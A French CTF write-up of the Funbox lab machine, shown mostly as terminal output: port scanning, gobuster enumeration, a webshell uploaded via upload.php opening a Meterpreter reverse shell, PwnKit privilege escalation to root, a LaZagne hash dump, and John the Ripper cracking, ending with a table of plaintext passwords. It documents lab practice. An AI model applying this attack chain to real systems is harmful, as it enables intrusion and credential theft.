# Funbox : CTF

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.134
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.134...100%
[+] Scan Nmap 192.168.56.134...100%
 
[+] 22/tcp open
[+] 80/tcp open
[+] 143/tcp open
[+] 110/tcp open
 
==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.134-tcp.html     |
==========================================================
```

&nbsp;

**<span style="color: #dddddd;">👊</span> Gobuster**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $gobuster dir -u http://192.168.56.134 -w /usr/share/wordlists/dirb/big.txt -x php,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.134
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/igmseklhgmrjmtherij2145236           (Status: 200) [Size: 11321]
Progress: 61407 / 61410 (100.00%)
===============================================================
Finished
===============================================================
```

&nbsp;

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $gobuster dir -u http://192.168.56.134/igmseklhgmrjmtherij2145236 -w /usr/share/wordlists/dirb/big.txt -x php,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.134
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/upload.php           (Status: 200) [Size: 113]
Progress: 61407 / 61410 (100.00%)
===============================================================
Finished
===============================================================
```

&nbsp;

**<span style="color: #dddddd;">💥</span> Metasploit - webshell**

J’ai uploader une webshell via la page `upload`

```
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 192.168.56.104:4444 
[*] Sending stage (40004 bytes) to 192.168.56.134
[*] Meterpreter session 1 opened (192.168.56.104:4444 -> 192.168.56.134:54776) at 2025-03-05 19:57:52 +0100

(Meterpreter 1)(/var/www/html/igmseklhgmrjmtherij2145236/upload) >
```

&nbsp;

**<span style="color: #dddddd;">🤖</span> Linpeas**

Élévation de privilège

```
www-data@funbox4:/tmp$ sh linpeas.sh

╔══════════╣ Executing Linux Exploit Suggester
╚[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

```

&nbsp;

**<span style="color: #dddddd;">💀</span> Exploit Pwnkit**

Test de l’exploit d’élévation de privilège

```
www-data@funbox4:/tmp$ ./PwnKit
./PwnKit
root@funbox4:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

&nbsp;

**<span style="color: #dddddd;">👾</span> LaZagne**

Cherchons les mot de passe sur la machine

```
root@funbox4:/tmp/LaZagne-2.4.6/Linux# python laZagne.py all
python laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Grub passwords -----------------

[+] Hash found !!!
Hash: $1$gLhU0/$aW78kHK1QfV3P2b2znUoe/

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: thomas
Hash: $6$cad0EXQ4$7ffqoKCpGycXPrfLpQfmHUcvI/B/MZYpruSn0/CkswysJK0tzXtvq9/MchS3yNx7MXwYQPv1qCCV9z5WKheJ10:18503:0:99999:7:::

[+] Hash found !!!
Login: root
Hash: $6$9apGG99N$YoPpLRWT1KF4rBXvRyoF4fDy.zE40KoPHoj5FoDMSFYDlEXO9Pf0vHaoFaRv8N.qBmqUi5kQjvRjH09aumkYC1:18504:0:99999:7:::

[+] Hash found !!!
Login: anna
Hash: $6$MieOM.Ky$vSzhA57uW5J2Q6WFjoM3zyTCOhSPlosWkh4XedeBvzYZDh3H4rKvBiQGaqD5x2M4XT4B4zhMPW2FomAhvZ3Rd/:18503:0:99999:7:::


[+] 4 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.13625597954
```

&nbsp;

**<span style="color: #dddddd;">🧨</span> JohnTheRipper**

Crack des mot de passe des utilisateurs

```
┌──[m0rph3u5@parrot]─[~/Desktop]
└──╼ $john funbox4 --wordlist=Desktop/rockyou.txt
Using default input encoding: UTF-8
Loaded 4 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
babygirl	 (root)
teladan		 (anna)
thebest!         (thomas)
topsecret        (?)
1g 0:00:02:19 DONE (2025-03-05 20:28) 0.007178g/s 1857p/s 1857c/s 1857C/s thebest15..teladan
Use the "--show" option to display all of the cracked passwords reliably

┌──[parrot@parrot]─[~/Desktop]
└──╼ $john funbox4 --show
root:babygirl:18504:0:99999:7:::
anna:teladan:18503:0:99999:7:::
thomas:thebest!:18504:0:99999:7:::
?:topsecret

4 password hash cracked, 0 left

```

&nbsp;

Identifiant trouver

| Users | Passwords |
| --- | --- |
| root | babygirl |
| anna | teladan |
| thomas | thebest! |
| ?   | topsecret |

&nbsp;

&nbsp;
